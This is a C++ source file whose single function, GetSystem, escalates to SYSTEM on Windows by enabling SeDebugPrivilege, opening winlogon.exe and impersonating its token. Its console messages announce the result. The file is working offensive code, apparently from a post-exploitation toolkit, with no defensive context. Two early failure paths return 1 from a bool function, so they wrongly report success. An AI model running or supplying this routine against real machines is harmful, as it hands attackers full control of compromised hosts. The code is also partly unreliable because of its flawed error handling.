#include "common.h"

bool GetSystem()
{ 
	// let's first make sure we have the SeDebugPrivilege enabled 
	HANDLE tempTokenHandle;
	auto success = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &tempTokenHandle);
	if(!success)
	{
		std::cout << "[-] Failed to open current process token, exiting...\n";
		return 1;
	}
	RAII::Handle currentToken = tempTokenHandle;

	success = SetPrivilege(currentToken.GetHandle(), L"SeDebugPrivilege", true);
	if (!success) return 1;

	RAII::Handle winlogonHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindPID(L"winlogon.exe"));
	if (!winlogonHandle.GetHandle())
	{
		std::cout << "[-] Couldn't get a PROCESS_ALL_ACCESS handle to winlogon.exe, exiting...\n";
		return false;
	}
	else std::cout << "[+] Got a PROCESS_ALL_ACCESS handle to winlogon.exe!\n";

	// we reuse tempTokenHandle and fill it with the token of winlogon.exe so that we don't have to make a new variable 
	success = OpenProcessToken(winlogonHandle.GetHandle(), TOKEN_QUERY | TOKEN_DUPLICATE, &tempTokenHandle);
	if (!success)
	{
		std::cout << "[-] Couldn't get a handle to winlogon.exe's token, exiting...\n";
		return success;
	}
	else std::cout << "[+] Opened a handle to winlogon.exe's token!\n";
	RAII::Handle tokenHandle = tempTokenHandle;
	
	success = ImpersonateLoggedOnUser(tokenHandle.GetHandle());
	if (!success)
	{
		std::cout << "[-] Couldn't impersonate winlogon.exe's token, exiting...\n";
		return success;
	}
	else std::cout << "[+] Successfully impersonated winlogon.exe's token, we are SYSTEM now ;)\n";
	return success;
}